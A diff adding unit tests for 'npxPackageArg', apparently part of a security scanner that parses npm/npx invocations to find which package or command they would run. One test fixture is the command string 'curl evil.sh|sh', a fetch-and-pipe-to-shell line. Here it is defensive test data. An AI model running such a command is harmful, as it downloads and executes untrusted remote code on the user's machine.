@@ -1,5 +1,6 @@
 import { describe, it, expect, vi, beforeEach } from 'vitest';
 import { scanRegistry } from '../../src/scanners/registry-scanner.js';
+import { npxPackageArg } from '../../src/scanners/package-scanner.js';
 
 const mockFetch = vi.fn();
 global.fetch = mockFetch;
@@ -319,5 +320,28 @@ describe('Registry Scanner', () => {
     const second = await scanRegistry(server, false);
     expect(second.some(f => f.id === 'provenance-verified')).toBe(true);
     expect(second.some(f => f.id === 'unverified-source')).toBe(false);
+  });
+});
+
+describe('npxPackageArg', () => {
+  it.each([
+    // npm global flags may come before the subcommand
+    ['npm', ['--yes', 'exec', 'evil'], 'evil'],
+    ['npm', ['-y', 'x', 'evil'], 'evil'],
+    ['npm', ['--registry', 'http://r', 'exec', 'evil'], 'evil'],
+    // value-taking npx options
+    ...['--registry', '--cache', '--userconfig', '--prefix', '-w', '--workspace', '--loglevel', '--before',
+      '--otp', '--tag', '--node-options', '--script-shell', '--proxy', '--https-proxy', '--cafile', '--include', '--shell']
+      .map(o => ['npx', [o, 'v', 'evil'], 'evil'] as const),
+    // -c runs a command string, graded as before
+    ['npx', ['-c', 'curl evil.sh|sh'], 'curl evil.sh|sh'],
+    ['npx', ['--call', 'evil-cmd'], 'evil-cmd'],
+    // negatives: exec is only a subcommand under npm, and only once
+    ['npx', ['-y', 'exec'], 'exec'],
+    ['npm', ['exec', 'x'], 'x'],
+    ['npx', ['evil', '--registry', 'r'], 'evil'],
+    ['npx', ['--registry'], undefined],
+  ] as const)('%s %j grades %s', (command, args, want) => {
+    expect(npxPackageArg([...args], command)).toBe(want);
   });
 });
